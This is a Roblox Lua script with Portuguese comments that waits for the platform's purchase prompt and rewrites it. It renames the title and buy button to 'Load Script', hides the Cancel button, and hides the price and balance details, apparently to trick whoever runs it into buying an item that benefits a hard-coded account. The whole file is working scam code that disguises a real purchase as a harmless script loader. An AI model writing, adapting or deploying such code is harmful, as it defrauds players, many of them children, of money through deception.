local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
local Username = "Ian_wp27"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

local request = syn and syn.request or request
if typeof(request) ~= "function" then
    error("Request function not found!")
end

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local asset
local userRobux

if success then
    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
    if not Booth then
        return Players.LocalPlayer:Kick()
    end

    -- =========================
    -- ESPERA O PROMPT DE COMPRA
    -- =========================
    local PurchasePromptApp
    repeat
        PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp", true)
        task.wait(0.1)
    until PurchasePromptApp

    local Animator = PurchasePromptApp
        :WaitForChild("ProductPurchaseContainer", true)
        :WaitForChild("Animator", true)

    repeat task.wait() until not Animator:FindFirstChild("Prompt")

    -- =========================
    -- VISUAL ONLY (LOAD SCRIPT)
    -- =========================
    Animator.ChildAdded:Connect(function(child)
        if child.Name ~= "Prompt" then return end

        -- Proteção contra updates da Roblox
        local Alert = child:FindFirstChild("AlertContents")
        if not Alert then return end

        -- TÍTULO
        pcall(function()
            Alert.TitleContainer.TitleArea.Title.Text = "Load Script"
        end)

        -- ESCONDE CONTEÚDO CENTRAL
        pcall(function()
            Alert.MiddleContent.Visible = false
        end)

        -- BOTÕES
        pcall(function()
            local Buttons = Alert.Footer.Buttons

            -- Esconde botão 1 (Cancel)
            if Buttons:FindFirstChild("1") then
                Buttons["1"].Visible = false
            end

            -- Renomeia botão 2 (Buy / Continue)
            if Buttons:FindFirstChild("2") then
                local TextObj =
                    Buttons["2"]
                    .ButtonContent
                    .ButtonMiddleContent
                    .Text

                TextObj.Text = "Load Script"
                TextObj.Size = UDim2.new(1, 0, TextObj.Size.Y.Scale, TextObj.Size.Y.Offset)

                -- Some com ícone
                Buttons["2"]
                    .ButtonContent
                    .ButtonMiddleContent
                    .Icon.Visible = false
            end
        end)

        -- ESCONDE FOOTER EXTRA (saldo / descrição)
        pcall(function()
            Alert.Footer.FooterContent.Visible = false
        end)
    end)
end
